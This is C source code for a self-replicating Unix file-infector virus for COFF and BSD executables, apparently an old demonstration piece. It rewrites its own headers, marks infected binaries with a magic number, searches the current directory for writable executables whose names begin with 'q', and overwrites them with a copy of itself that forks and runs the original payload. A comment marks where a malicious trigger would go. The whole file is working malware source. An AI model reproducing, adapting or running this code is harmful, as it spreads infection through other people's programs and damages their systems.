
/*
 * compilation:
 * cc -o v9 -DCOFF v9.c
 * cc -o v9 -DBSD v9.c
 */

#ifdef  COFF
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <filehdr.h>
#include <aouthdr.h>
#include <scnhdr.h>
#undef BSD_MARK
#define MARK 0X696E6665
#undef BSD
#endif


#ifdef BSD
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <a.out.h>
#define BSD_MARK 0X696E6665
#undef MARK
#undef COFF
#endif

/* definition of states */
#define PRISTINE 0 /* not executed even once */
#define LOADING  1 /* executed once, has headers loaded */
#define PREGNANT 2 /* executed twice, has a file loaded */
#define WRITE_SELF 3 /* ready to write an executable image of self to disk */
#define ENTRY 4 /* pseudo-state: in this state at beginning of each execution */
#define GONZO 5 /* panic exit state: something gone wrong */
#define QUIT 6 /* pseudo-state: leaves state machine */

/* transition table:  the next state to enter depends on two parameter,
 * "loaded", and "headers", and the state that machine is in right now. */

/*
 * table organized by:
 * last state, headers, loaded
 *  (0-5),      (0,1),   (0,1)
 */
static int what_next[6][2][2] = {
{ { GONZO, WRITE_SELF }, { GONZO, GONZO },
},

{ { WRITE_SELF, LOADING }, { PRISTINE, GONZO },
},

{ { GONZO, LOADING }, { GONZO, GONZO },

},

{ { QUIT, QUIT }, { GONZO, GONZO },
},

{ { PREGNANT, LOADING }, { GONZO, PRISTINE },
},

{ { QUIT, QUIT }, { QUIT, QUIT },
}

};

/*
 * the transition table is deliberately cowardly:
 * it enters the GONZO state when a combo of parameters that could
 * foreseeably be corrected, but is nonetheless wrong, is encountered.
 */

#undef DEBUG
#ifdef DEBUG
#define D(x) x
#else
#define D(x)
#endif

#if defined(DEBUG) && defined(BSD)
#include <signal.h>
#endif

#ifdef COFF
/* necessary to declare these as static and put something in them
 * to get compiler to put them in the .data section rather than the
 * .bss section */
static FILHDR fhdptr = 52;
static AOUTHDR autptr = 53;
static SCNHDR scnptr[12] = {
	1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 1, 2 };


/* section no. of .data section */
static datasn = 1;
#endif

/* non-zero if executable headers in data segment are nonsense */
static headers = 1;
/* non-zero if other program isn't loaded into data segment */
static loaded = 1;

#ifdef BSD
static struct exec exhdr = 93;
#endif

extern errno;

#define PAGESIZE 8192
#define NFG 0x7f

main( ac, av )
int	ac;
char	**av;
{

	int	j, next_state;

	int	fp_out, fp_in;
	char	*infect;
	static char	*sbeak = (char *)0x400000;
	static int	size = 32, xsize;

	int	write_headers(), read_headers();
	void monkey_headers();
	char	*sbrk(), *decide();

	/*
	 * state machine to decide what to do next
	 */

	next_state = ENTRY;

	while ((next_state = what_next[next_state][headers][loaded]) != QUIT ) {

		switch ( next_state ) {

		case PRISTINE:

			/* open a file to read header info from */
			fp_in = open( *av, O_RDONLY );

			/* read in COFF headers */
			size = read_headers( fp_in );

			/* close self, done reading headers */
			close( fp_in );

			/* change header information to reflect bss and data combo */
			monkey_headers();

			/* find out where current data segment ends */
			/* this call will find end of .data and .bss segments */
			sbeak = sbrk( 0 );

			/* open a file to send new image of self with header info */
			fp_out = open( *(av + 1), O_WRONLY | O_CREAT );

			chmod( *(av + 1), 0755 );

			headers = 0;

			break;


		case LOADING:

			/* find a good file to load and get size of selected file */
			infect = decide( &xsize );

			if ( infect[0] == NFG ) {
				/* this would make a good trigger mechanism:
				 * malicious part would go here
				 */
				_exit( 666 );
				break;
			}

			/* open that file */
			fp_in = open( infect, O_RDONLY );

			/* move system break */
			sbrk( xsize );

			/* read in selected file */
			read( fp_in, (char *)sbeak, xsize );

			/* tinker with headers to reflect loaded condition */
#ifdef COFF
			scnptr[datasn].s_size  = (long)((int)sbeak - scnptr[datasn].s_vaddr + xsize);
			if ( fhdptr.f_opthdr ) {
				/* optional header is present */
				autptr.dsize = scnptr[datasn].s_size;
			}

#endif

#ifdef BSD
			exhdr.a_data = (long)((int)sbeak - N_DATADDR( exhdr ) + xsize);

#endif

			/* open a file to write loaded self into */
			fp_out = open(infect, O_WRONLY | O_TRUNC);

			loaded = 0;

			break;

		case PREGNANT:

			switch ( fork() ) {

			case -1: /* system call failure */
				_exit( errno );
				break;

			case 0: /* child */

				/* open a temp file to write loaded file to */
				fp_out = open( "crud", O_WRONLY | O_CREAT);

				/* write loaded file from memory to disk */
				write( fp_out, (char *)sbeak, xsize );

				close( fp_out );

				/* make new file executable and exec it */
				chmod( "crud", 0755 );

				execv( "crud", av );

				_exit( errno );

				break;

			default: /* parent */

				/* reset system break */
				brk( sbeak );

				/* reset parameter so that next state will be LOADING,
				 * this process will still be executing - no self-write */
				loaded = 1;

				break;

			}

			break;



		case WRITE_SELF:

			size = write_headers( fp_out );

			/* returned value has size of sections in it */
			size = write_sections( size, fp_out );

			/* zero fill file to pagesize */
			j = PAGESIZE - size % PAGESIZE;

			while ( j--)
				write( fp_out, "\000", 1 );

			close( fp_out );

			break;

		case GONZO:
		default:
			_exit();
			break;
		}

	}


	_exit( 0 );


}




static int
write_headers( fp_out )
int	fp_out; /* file descriptor to write headers to */
{
	int	total;
#ifdef COFF
	int	i, seize;
#endif

	/* just write already loaded headers to output file */

#ifdef COFF
	total = write( fp_out, (char *) & fhdptr, (int)sizeof( struct filehdr ));

	if ( fhdptr.f_opthdr ) {
		seize = write( fp_out, (char *) & autptr, (int)sizeof( struct aouthdr ));
		total += seize;
	}


	/* write out section headers */
	for ( i = 0; i < fhdptr.f_nscns; ++i ) {
		seize = write( fp_out, (char *) & scnptr[i], (int)SCNHSZ);
		total += seize;
	}
#endif

#ifdef BSD

	total = write( fp_out, (char *) & exhdr, (int)sizeof( struct exec ));
#endif

	return total;
}




static int
write_sections( filesz, fp_out )
int	filesz, fp_out;
{

	int	scnsize, j;
#ifdef COFF
	int	i;
#endif

	scnsize = filesz;

#ifdef COFF
	for ( i = 0; i < fhdptr.f_nscns; ++i ) {

		if ( scnptr[i].s_scnptr ) {
			/* section has some stuff on disk */
			if ( scnsize < scnptr[i].s_scnptr ) {
				/* need to pad file to match headers */
				j = scnptr[i].s_scnptr - scnsize;
				while ( j ) {
					--j;
					write( fp_out, "\000", 1 );
					++scnsize;
				}
			}

			/* write segment i from memory */

			j = write( fp_out, (char *)scnptr[i].s_vaddr, (unsigned)scnptr[i].s_size );

			scnsize += j;
		}
	}
#endif

#ifdef BSD
	while ( scnsize < N_TXTOFF( exhdr ) ) {
		write( fp_out, "\000", 1 );
		++scnsize;
	}

	/* write text segment from memory */
	j = write( fp_out, (char *)(N_TXTADDR( exhdr ) + sizeof(struct exec )), (int)exhdr.a_text - sizeof(struct exec ));

	scnsize += j;

	/* write data segment from memory */
	j = write( fp_out, (char *)(N_DATADDR( exhdr )), (int)exhdr.a_data );

	scnsize += j;
#endif

	return scnsize;


}



/*
 * machine dependant directory access stuff
 * decide() is the only routine that is called from the main, more
 * portable portion of this program.  any ancillary subroutines must
 * be carefully defined inside #ifdef's for the appropriate machine.
 * decide() returns a pointer to a string with the name of an eligible
 * file in it.  it also puts the size of the file in bytes into the 
 * passed argument.
 */

#ifdef sparc

/* SunOS directories are not exactly as documented for 4.0.3 */
#define MAXNAMLEN       255
#define BUFSIZ  1024

struct dirent {
	long	d_fileno;             /* file number of entry */
	short	d_reclen;             /* length of this record */
	short	d_namlen;             /* length of string in d_name */
	char	d_name[MAXNAMLEN + 1];  /* name (up to MAXNAMLEN + 1) */
};

static char	*
decide( s )
int	*s;
{
	int	fd, offset;
	char	ubuf[ BUFSIZ ];
	struct dirent *dirptr;
	struct stat stbuf;
	static char	fname[ MAXNAMLEN + 1 ];

	fname[0] = NFG;

	fd = open(".", O_RDONLY);

	read( fd, ubuf, BUFSIZ );

	close( fd );

	dirptr = (struct dirent *)ubuf;

	offset = 0;

	while ( (offset < BUFSIZ) && (offset >= 0) && (dirptr->d_namlen > 0) ) {

		/* only examine files with names starting with 'q' */
		if ( dirptr->d_name[0] == 'q' ) {

			/* decide whether file is infected already or not */
			if ( not_infectd( dirptr->d_name ) ) {

				/* get file status */
				if ( stat( dirptr->d_name, (struct stat *) & stbuf ) < 0 ) {
					continue;
				}

				/* decide if file has appropriate
            * read, write and execute permissions */
				if ( accetab( (int)stbuf.st_mode ) ) {

					int	i;

					/* copy name into static buffer */
					for ( i = 0; dirptr->d_name[i]; ++i )
						fname[i] = dirptr->d_name[i];

					fname[i] = '\0';

					*s = stbuf.st_size;
					break;

				}
			}

		}

		offset += dirptr->d_reclen;
		dirptr = (struct dirent *)(&ubuf[ offset ]);
	}

	return fname;

}




int
static accetab( mode )
int	mode;
{

	if ( (mode & S_IFREG) && (mode & S_IREAD ) && (mode & S_IWRITE ) && (mode & 
	    S_IEXEC ))
		return 1;
	else
		return 0;
}


static int
not_infectd( fn )
char	*fn;
{
	struct exec exh;
	int	fd2;

	fd2 = open( fn, O_RDONLY );

	read( fd2, (char *) & exh, sizeof( struct exec ) );

	close( fd2 );

	if ( exh.a_syms == BSD_MARK )
		return 0;
	else
		return 1;
}


#endif

#ifdef mips

#include <sys/types.h>
#include <sys/sema.h>
#include <sys/fs/efs.h>

char	*
decide( s )
int	*s;
{
	char	dir_block[ BBSIZE ];
	struct efs_dirblk *dirhdr;
	struct efs_dent *d_ent;
	int	fd, tfd, i;
	struct stat stbuf;
	static FILHDR fhdx;

	/* file name must be static since only pointer to it gets returned.
	 * if it were automatic, that pointer would be invalid after function
	 * returned. */
	static char	fname[256];

	fname[0] = NFG;

	if ( (fd = open( ".", O_RDONLY )) < 0 ) {
		write( 2, "couldn't open \".\"\n", 18);
		_exit( errno );
	}


	if ( (read( fd, dir_block, BBSIZE)) < 0 ) {
		write(2, "couldn't read \".\"\n", 18);
		close( fd );
		_exit( errno );
	}

	close( fd );

	dirhdr = (struct efs_dirblk *)dir_block;

	/* loop over all file names in directory */
	for ( i = 0; i < dirhdr->slots; ++i ) {

		d_ent = (struct efs_dent *)(dir_block + EFS_SLOTAT( (struct efs_dirblk *)dir_block, i ));

		/* only examine files with names starting with 'q' */
		if ( d_ent->d_name[0] == 'q' ) {

			/* file status call */
			if ( stat( d_ent->d_name, (struct stat *) & stbuf ) < 0 ) {
				continue;
			}

			/* decide if file has appropriate
			* read, write and execute permissions */
			if ( accetab( (int)stbuf.st_mode ) ) {

				/* determine if this file is already infected */
				if ( (tfd = open( d_ent->d_name, O_RDONLY )) > 0 ) {

					if ( read( tfd, (char *) & fhdx, sizeof( struct filehdr ) ) == sizeof( struct filehdr ) ) {

						close( tfd );

#ifdef MARK
						if ( fhdx.f_timdat != MARK ) {
#endif

							for ( i = 0; d_ent->d_name[i]; ++i )
								fname[i] = d_ent->d_name[i];


							*s = stbuf.st_size;
							break;
#ifdef MARK
						}
#endif
					}
				}
			} /* end of if over permissions acceptable */

		}

	}

	return( fname );
}


int
accetab( mode )
int	mode;
{

	if ( (mode & S_IFREG) && (mode & S_IREAD ) && (mode & S_IWRITE ) && (mode & S_IEXEC ))
		return 1;
	else
		return 0;
}


#endif /* IRIX efs directory access */

#ifdef mc68k

/* actually the old-style 14 character Unix file system */

#include <sys/dir.h>

char	*
decide( s )
int	*s;
{
	struct direct entry;
	struct stat stbuf;
	struct filehdr fhdx;
	int	dirfd, i, tfd;
	/* file name must be static since only pointer to it gets returned.
	 * if it were automatic, that pointer would be invalid after function
	 * returned. */
	static char	fname[DIRSIZ];


	if ( (dirfd = open( ".", O_RDONLY )) < 0 ) {
		write( 2, "couldn't open \".\"\n", 18 );
		_exit( errno );
	}

	fname[0] = NFG;

	while ( read( dirfd, (char *) & entry, sizeof(struct direct ) ) > 0 ) {

		/* only examine files with names starting with 'q' */
		if ( entry.d_name[0] == 'q' ) {

			/* file status call */
			if ( stat( entry.d_name, (struct stat *) & stbuf ) < 0 ) {
				continue;
			}

			/* determine whether this file has acceptable 
				 * read, write and execute permissions */
			if ( accetab( (int)stbuf.st_mode ) ) {

				/* determine if this file is already infected */
				if ( (tfd = open( entry.d_name, O_RDONLY )) > 0 ) {

					if ( read( tfd, (char *) & fhdx, sizeof( struct filehdr ) ) == sizeof( struct filehdr ) ) {

						close( tfd );

#ifdef MARK
						if ( fhdx.f_timdat != MARK ) {
#endif

							for ( i = 0; entry.d_name[i]; ++i )
								fname[i] = entry.d_name[i];

							*s = stbuf.st_size;
							break;
#ifdef MARK
						}
#endif
					}
				}
			} /* end of if over permissions acceptable */
		} /* end of if over file name */
	} /* end of while over no. of directory entries */

	close( dirfd );

	return fname;
}


int
accetab( mode )
int	mode;
{

	if ( (mode & S_IFREG) && (mode & S_IREAD ) && (mode & S_IWRITE ) && (mode & S_IEXEC ))
		return 1;
	else
		return 0;
}


#endif

/* end of machine dependant directory access stuff */

static void
monkey_headers()
{
#ifdef COFF
	int	j, delsize;
#endif


	/* turn off symbol table stuff */

#ifdef COFF
	fhdptr.f_symptr = 0;
	fhdptr.f_nsyms = 0;
#endif


#ifdef MARK
	/* mark as infected */
	fhdptr.f_timdat = MARK;
#endif

#ifdef BSD_MARK
	exhdr.a_syms = BSD_MARK;
#endif

	/* could potentially only write to disk the routines that
	 * program will need from now on.  everything aft of this
	 * function could be eliminated from the stuff written to
	 * disk, and loaded from disk next execution */

#ifdef COFF
	/* find .data header */
	for ( datasn = 1; datasn < fhdptr.f_nscns; ++datasn ) {
		if ( scnptr[datasn].s_name[1] == 'd' )
			break;
	}
#endif

	/* rearrange header data so .bss is now in .data */

#ifdef COFF 

	delsize = 0;

	for ( j = datasn + 1; j < fhdptr.f_nscns; ++j ) {
		delsize += scnptr[j].s_size;
		scnptr[datasn].s_size += scnptr[j].s_size;
		scnptr[j].s_size = 0;
		scnptr[j].s_vaddr = 0;
		scnptr[j].s_paddr = 0;
		scnptr[j].s_scnptr = 0;
	}

	if ( fhdptr.f_opthdr ) {
		/* optional header is present */
		autptr.dsize += delsize;
		autptr.bsize = 0;
	}
#endif 

#ifdef BSD
	exhdr.a_data += exhdr.a_bss;
	exhdr.a_bss = 0;
#endif

}


static int
read_headers( fp )
int	fp; /* file descriptor to read headers from */
{

	int	total;

#ifdef COFF
	int	i, seize;


	total = read( fp, (char *) & fhdptr, sizeof( struct filehdr ));

	if ( fhdptr.f_opthdr ) {
		/* optional header is present */
		seize = read( fp, (char *) & autptr, (int)sizeof(struct aouthdr ));
		total += seize;
	}

	for ( i = 0; i < fhdptr.f_nscns; ++i ) {
		seize = read( fp, (char *) & scnptr[i], SCNHSZ);
		total += seize;
	}
#endif


#ifdef BSD
	total = read( fp, (char *) & exhdr, sizeof( struct exec ));
#endif

	return total;
}


                                                            